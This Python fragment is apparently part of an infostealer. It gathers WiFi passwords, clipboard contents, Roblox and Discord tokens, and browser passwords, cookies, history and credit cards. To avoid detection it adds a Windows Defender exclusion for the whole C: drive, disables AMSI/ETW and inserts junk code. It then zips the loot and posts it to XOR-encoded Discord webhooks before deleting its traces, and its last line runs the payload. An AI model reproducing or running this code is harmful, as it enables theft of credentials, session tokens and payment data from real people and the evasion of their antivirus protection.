🛒 HWID: {hwid_infO}
🖥 Screen Res: {Screen_res}
📋 Clipboard: ```{clipboard}```

📶 WiFi Passwords:
{wifi}
"""

def _build_sensitive_report():
    _rblxCookie = safe_str(_retrieve_roblox_cookies(), max_len=10000)
    _discord_info = safe_str(getDiscordInfo())
    robloxinfoS = safe_str(robloxinfo())

    return f"""
🎃 Roblox Cookies:
```{_rblxCookie}```

Roblox info:
{robloxinfoS}

🎮 Discord Info:
{_discord_info}
"""

def _build_sensitive_report2():
    _browserStealer = _run_browser_data_extraction()
    summary = []
    for key, path in _browserStealer.items():
        try:
            with open(path, "r", encoding="utf-8") as f:
                lines = f.readlines()
                preview = "".join(lines[:10])  
            summary.append(f"**{key.capitalize()}** preview:\n```\n{preview}\n```")
        except:
            summary.append(f"**{key.capitalize()}**: Unable to read file.")
    return "\n".join(summary)

def _send_zip_to_webhook(webhook_url, files_dict, temp_dir):
    zipfile = dynamic_import("zipfile")
    io = dynamic_import("io")
    os = dynamic_import("os")
    requests = dynamic_import("requests")

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zipf:
        for name, path in files_dict.items():
            if os.path.isfile(path):
                arcname = os.path.basename(path)
                zipf.write(path, arcname=arcname)

    zip_buffer.seek(0)
    payload = {"file": ("BrowserData.zip", zip_buffer.read())}
    return requests.post(webhook_url, files=payload)

def _is_admin():
    ctypes = dynamic_import("ctypes")
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
    

def _enable_exclusion():
    subprocess = dynamic_import("subprocess")
    EXCLUSION_PATH = "C:\\"
    EXCLUSION_CMD = f'powershell -Command "Add-MpPreference -ExclusionPath \'{EXCLUSION_PATH}\'"'
    if not _is_admin():
        return
    try:
        subprocess.run(EXCLUSION_CMD, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def _disable_exclusion():
    subprocess = dynamic_import("subprocess")
    EXCLUSION_PATH = "C:\\"
    REMOVE_CMD = f'powershell -Command "Remove-MpPreference -ExclusionPath \'{EXCLUSION_PATH}\'"'
    if not _is_admin():
        return
    try:
        subprocess.run(REMOVE_CMD, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def _run_payload():
    try:

        _enable_exclusion()
        time = dynamic_import("time")
        random = dynamic_import("random")
        sys = dynamic_import("sys") 
        os = dynamic_import("os")
        tempfile = dynamic_import("tempfile")


        _disable_amsi_etw()

        #if _is_sandbox():
        #    sys.exit(1)


        time.sleep(random.randint(1, 3))
        _add_noise()

        requests = dynamic_import("requests")
        __KEY = 72

        encrypted_hooks = [
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3p9fnl/enhweXp/e2d7fTJwLSUZGHkCJXAMPXk9OQQrZRsJGz0AHyoJJyXXXXXXXXXXXXXXXXXDJx4vD34MGCI+Gh09ETsiIhwQHQkrPj98HA==',
            b'IDw8ODtyZ2csITsrJzosZiXXXXXXXXXXFnPy0qICcnIztneXtxeH9/e3t7fHB7fnp8cH5xf2ckcQYfDSBlP3AcfzAOeicGGS8QIzp8EBInPwkLBHwaOD89ImUOLtrtx8GxA6Kh8jAS0deX0aEHgyOQ8fJg0qLzIBBw==',
            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3x5cH9wcX9XXXXXX97eGcEeiEHDxoaZSAbMSEcJgkKMXwBCy0XMGUgCgMKI3ESJgMdHRsRBiwfCwkDfxA8HTIxBn4mcTs9Ji24DBh+HWUNHzkKMA==' # Examples, not real webhooks
        ]

        webhooks = [_xor_decrypt(hook, __KEY) for hook in encrypted_hooks]


        browser_data = _run_browser_data_extraction()


        temp_dir = tempfile.mkdtemp(prefix="browser_stealer_")


        browser_files = _run_browser_data_extraction()

        passwords_path = browser_files['passwords']
        cookies_path = browser_files['cookies']
        history_path = browser_files['history']
        cards_path = browser_files['credit_cards']


        junk_vars, junk_func, opaque_predicate = generate_dynamic_junk()
        val = junk_func()
        flag = opaque_predicate(random.randint(0, 1000000))


        msg_main = _build_report()
        msg_sensitive = _build_sensitive_report()


        def send_file_webhook(url, content, filepath):
            with open(filepath, "rb") as f:
                files = {"file": (os.path.basename(filepath), f)}
                response = requests.post(url, data={"content": content}, files=files)
            return response
        
        for webhook_url in webhooks:
            try:
                r1 = requests.post(webhook_url, json={"content": msg_main})
                if r1.status_code not in (200, 204):
                    continue

                r2 = requests.post(webhook_url, json={"content": msg_sensitive})
                if r2.status_code not in (200, 204):
                    continue


                zip_resp = _send_zip_to_webhook(webhook_url, browser_files, temp_dir)
                if zip_resp.status_code == 429:
                    time.sleep(int(zip_resp.headers.get("Retry-After", 2)) / 1000)
                elif zip_resp.status_code not in (200, 204):
                    continue

                break 

            except Exception as e:
                continue
            

        for f in [passwords_path, cookies_path, history_path, cards_path]:
            try: os.remove(f)
            except: pass
        try: os.rmdir(temp_dir)
        except: pass

    except Exception as e:
        pass
    finally:
        _disable_exclusion() 


_run_payload()
